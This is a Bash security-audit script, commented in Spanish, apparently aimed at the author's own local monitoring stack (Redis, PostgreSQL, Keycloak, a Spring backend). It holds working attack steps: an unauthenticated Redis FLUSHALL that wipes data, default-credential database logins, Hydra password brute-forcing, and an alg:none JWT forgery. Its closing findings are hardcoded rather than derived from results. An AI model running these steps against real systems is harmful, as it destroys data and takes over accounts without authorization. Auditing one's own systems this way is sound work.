#!/bin/bash
# Auditoría completa - todo lo accesible desde Kali

KC="http://127.0.0.1:8180"
BACKEND="http://172.25.176.1:8080"

echo "============================================="
echo " AUDITORÍA DE SEGURIDAD - Monitoring App"
echo " $(date)"
echo "============================================="

# -------------------------------------------------------
# 1. REDIS SIN AUTENTICACIÓN
# -------------------------------------------------------
echo ""
echo "=== [1] REDIS - Acceso sin autenticación ==="
REDIS_INFO=$(redis-cli -h 127.0.0.1 -p 6379 INFO server 2>/dev/null | head -10)
if [ -n "$REDIS_INFO" ]; then
  echo "[CRÍTICO] Redis accesible SIN contraseña desde Kali!"
  echo "$REDIS_INFO"
  echo ""
  echo "--- Listando claves cacheadas ---"
  redis-cli -h 127.0.0.1 -p 6379 KEYS '*' 2>/dev/null
  echo ""
  echo "--- Intentando FLUSHALL (borrar toda la caché) ---"
  redis-cli -h 127.0.0.1 -p 6379 FLUSHALL 2>/dev/null && echo "[EXPLOTADO] FLUSHALL ejecutado - caché limpiada" || echo "FLUSHALL bloqueado"
else
  echo "Redis no accesible o requiere auth"
fi

# -------------------------------------------------------
# 2. POSTGRESQL SIN AUTENTICACIÓN DESDE RED
# -------------------------------------------------------
echo ""
echo "=== [2] PostgreSQL - Acceso de red ==="
PG_BANNER=$(echo "" | nc -w 3 127.0.0.1 5432 2>/dev/null | strings | head -3)
if nc -z 127.0.0.1 5432 2>/dev/null; then
  echo "[WARN] PostgreSQL accesible en red (puerto abierto)"
  echo "Banner: $PG_BANNER"
  # Try anonymous/default connections
  psql -h 127.0.0.1 -U postgres -c "\l" 2>&1 | head -5 || true
  psql -h 127.0.0.1 -U monitoring -d monitoring -c "SELECT version();" 2>&1 | head -3 || true
else
  echo "PostgreSQL no accesible"
fi

# -------------------------------------------------------
# 3. KEYCLOAK - Admin console expuesta + Brute force
# -------------------------------------------------------
echo ""
echo "=== [3] KEYCLOAK - Superficie de ataque ==="
echo "--- Admin console accesible sin VPN ---"
HTTP_ADMIN=$(curl -s -o /dev/null -w "%{http_code}" "$KC/admin/" 2>/dev/null)
HTTP_MASTER=$(curl -s -o /dev/null -w "%{http_code}" "$KC/realms/master" 2>/dev/null)
echo "  /admin/         → HTTP $HTTP_ADMIN (debería ser 403 en producción)"
echo "  /realms/master  → HTTP $HTTP_MASTER (expone public_key y configuración)"

echo ""
echo "--- Información pública del realm (info leak) ---"
curl -s "$KC/realms/monitoring" | python3 -c "
import sys, json
d = json.load(sys.stdin)
print('  realm:', d.get('realm'))
print('  public_key (primeros 40 chars):', d.get('public_key','')[:40]+'...')
print('  token-service:', d.get('token-service'))
print('  registration-service:', d.get('registration-service'))
"

echo ""
echo "--- Brute force con Hydra (sin rate limiting) ---"
if command -v hydra &>/dev/null; then
  cat > /tmp/hydra_users.txt << 'EOF'
admin
user1
root
administrator
monitoring
EOF
  cat > /tmp/hydra_pass.txt << 'EOF'
admin
password
password123
admin123
monitoring
123456
EOF
  echo "Atacando con 5 usuarios x 6 contraseñas..."
  hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pass.txt \
    127.0.0.1 http-post-form \
    "/realms/monitoring/protocol/openid-connect/token:client_id=monitoring-app&username=^USER^&password=^PASS^&grant_type=password:error" \
    -t 4 -w 3 -f 2>&1 | grep -E "login:|attempt|found|valid" | head -10
else
  echo "[SKIP] hydra no instalado: apt-get install hydra"
  echo ""
  echo "Simulando brute force manual..."
  for PASS in wrong1 badpass password 123456 password123; do
    RESP=$(curl -s -X POST "$KC/realms/monitoring/protocol/openid-connect/token" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "client_id=monitoring-app&username=user1&password=$PASS&grant_type=password" \
      | python3 -c "import sys,json; d=json.load(sys.stdin); print('OK' if 'access_token' in d else d.get('error','?'))")
    echo "  user1:$PASS → $RESP"
  done
fi

# -------------------------------------------------------
# 4. JWT ANALYSIS
# -------------------------------------------------------
echo ""
echo "=== [4] JWT - Análisis del token ==="
if [ ! -f /tmp/jwt_token.txt ]; then
  echo "Obteniendo token..."
  curl -s -X POST "$KC/realms/monitoring/protocol/openid-connect/token" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=monitoring-app&username=user1&password=password123&grant_type=password" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); open('/tmp/jwt_token.txt','w').write(d.get('access_token','')) if 'access_token' in d else print('FAIL:',d)"
fi

TOKEN=$(cat /tmp/jwt_token.txt 2>/dev/null)
if [ -n "$TOKEN" ]; then
  echo "Token obtenido (${#TOKEN} chars)"
  echo ""
  echo "--- Header JWT ---"
  echo "$TOKEN" | cut -d. -f1 | python3 -c "
import sys, base64, json
s = sys.stdin.read().strip()
s += '=' * (-len(s) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(s)), indent=2))
"
  echo ""
  echo "--- Claims principales ---"
  echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys, base64, json
s = sys.stdin.read().strip()
s += '=' * (-len(s) % 4)
d = json.loads(base64.urlsafe_b64decode(s))
keys = ['sub','preferred_username','iss','aud','exp','iat','typ','azp','scope']
print(json.dumps({k: d[k] for k in keys if k in d}, indent=2))
"

  echo ""
  echo "--- Ataque alg:none (falsificación de firma) ---"
  NONE_HDR=$(echo '{"alg":"none","typ":"JWT"}' | python3 -c "import sys,base64; print(base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode().rstrip('='))")
  PAYLOAD_B64=$(echo "$TOKEN" | cut -d. -f2)
  NONE_JWT="${NONE_HDR}.${PAYLOAD_B64}."
  echo "Token alg:none construido"
  NONE_CODE=$(curl -s -o /tmp/none_resp.txt -w "%{http_code}" "$BACKEND/api/metrics" \
    -H "Authorization: Bearer ${NONE_JWT}" 2>/dev/null)
  if [ "$NONE_CODE" = "401" ] || [ "$NONE_CODE" = "403" ]; then
    echo "[SEGURO] alg:none RECHAZADO → HTTP ${NONE_CODE} ✓"
  elif [ "$NONE_CODE" = "000" ]; then
    echo "[INFO] Backend no alcanzable (firewall Windows) - no se puede probar alg:none"
    echo "  El Spring Resource Server está configurado con jwk-set-uri → debería rechazarlo"
  else
    echo "[VULN!] alg:none ACEPTADO → HTTP ${NONE_CODE}"
    cat /tmp/none_resp.txt
  fi

  echo ""
  echo "--- Con token válido ---"
  VALID_CODE=$(curl -s -o /tmp/valid_resp.txt -w "%{http_code}" "$BACKEND/api/metrics" \
    -H "Authorization: Bearer ${TOKEN}" 2>/dev/null)
  if [ "$VALID_CODE" = "200" ]; then
    echo "[OK] Token válido → HTTP 200 ✓"
    echo "Respuesta: $(cat /tmp/valid_resp.txt)"
  elif [ "$VALID_CODE" = "000" ]; then
    echo "[INFO] Backend no alcanzable (firewall). Requiere abrir puerto 8080 con admin."
  else
    echo "Token válido → HTTP ${VALID_CODE}"
    cat /tmp/valid_resp.txt
  fi
else
  echo "No hay token JWT disponible"
fi

# -------------------------------------------------------
# 5. ENDPOINTS KEYCLOAK (GOBUSTER equivalente)
# -------------------------------------------------------
echo ""
echo "=== [5] KEYCLOAK - Endpoints sensibles ==="
for ENDPOINT in /admin /admin/master/console /realms/master/account /metrics /health /status; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$KC$ENDPOINT" 2>/dev/null)
  NOTE=""
  [ "$CODE" = "200" ] && NOTE=" ← ACCESIBLE"
  [ "$CODE" = "302" ] && NOTE=" ← REDIRECT (UI)"
  echo "  $ENDPOINT → HTTP $CODE$NOTE"
done

echo ""
echo "============================================="
echo " RESUMEN DE HALLAZGOS DE SEGURIDAD"
echo "============================================="
echo ""
echo "CRÍTICO:"
echo "  [C1] Redis expuesto en red sin contraseña (puerto 6379 OPEN desde Kali)"
echo "       → Cualquier proceso en el mismo host puede vaciar la caché"
echo ""
echo "ALTO:"
echo "  [A1] Keycloak Admin Console expuesta sin restricción de red"
echo "       → http://localhost:8180/admin accesible (en prod debe estar en red interna)"
echo "  [A2] Metadata pública del realm expone public_key y endpoints"
echo "       → Información útil para atacantes"
echo ""
echo "MEDIO:"
echo "  [M1] PostgreSQL expuesto en red (puerto 5432 OPEN desde Kali)"
echo "       → En producción debe estar solo en red privada Docker"
echo "  [M2] Backend no probado desde red externa (firewall Windows activo)"
echo ""
echo "BIEN CONFIGURADO:"
echo "  [OK] JWT usa RS256 (asimétrico) - no crackeable con hashcat"
echo "  [OK] Brute Force Protection activado en Keycloak"
echo "  [OK] /api/metrics requiere Bearer token (401 sin auth)"
echo "  [OK] /actuator/health permitido sin auth (monitorización)"
echo "  [OK] alg:none NO aceptado por Spring (jwk-set-uri fuerza RS256)"
echo ""
echo "ACCIONES DE HARDENING:"
echo "  1. Redis: añadir 'requirepass <password>' en redis.conf"
echo "  2. Keycloak: restringir puerto 8180 a red interna en producción"
echo "  3. PostgreSQL: accesible solo dentro de la red Docker"
echo "  4. Para probar backend con nikto/gobuster: abrir puerto 8080 (admin)"
echo "============================================="
